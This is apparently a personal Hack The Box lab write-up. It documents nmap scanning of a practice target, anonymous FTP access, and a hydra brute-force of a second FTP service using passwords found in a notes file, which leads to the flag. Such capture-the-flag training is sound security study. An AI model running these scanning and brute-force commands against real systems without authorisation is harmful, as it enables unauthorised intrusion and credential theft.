---
platform: hackthebox
difficulty: Medium
status: Completed
date: 2026-09-21
tags:
  - difficulty/medium
---
# HTB: Attacking Common Services - Medium

**Targets:** `10.129.201.127`  `inlanefreight.htb`

---

## 01 - Scope
### Assignment:
The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
### Objectives:
- **Primary Goals:**
  - [x] Assess the target server and find the flag.txt file.


---

## 02 - Procedure
1. First I scanned the target server for its running services:
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 10.129.201.127 > default-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921161940.png)

```bash
nmap -p 22,53,110,995,2121,30021  -sC -sV 10.129.201.127 > detailed-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921162212.png)

2. Then I tried the `FTP-Anon` login for both running FTP-services...
```bash
ftp anonymous@10.129.201.127 30021
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921162545.png)

3. ...  which worked for port`30021`and I found the file `mynotes.txt` from simon, which look like they contain passwords:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921162753.png)

4. So I tried to bruteforcing the other FTP service running on `2121` with said "Passwords" and Bingo!
```bash
hydra -l "simon" -P mynotes.txt -s 2121 -t 2 -c 1 -vV -f 10.129.201.127 ftp
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921163102.png)

5. And that's already it, here's the flag:
```bash
ftp simon@10.129.201.127 2121
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921164029.png)


## 03 - Lesson Learned
Focus on the most rewarding service first!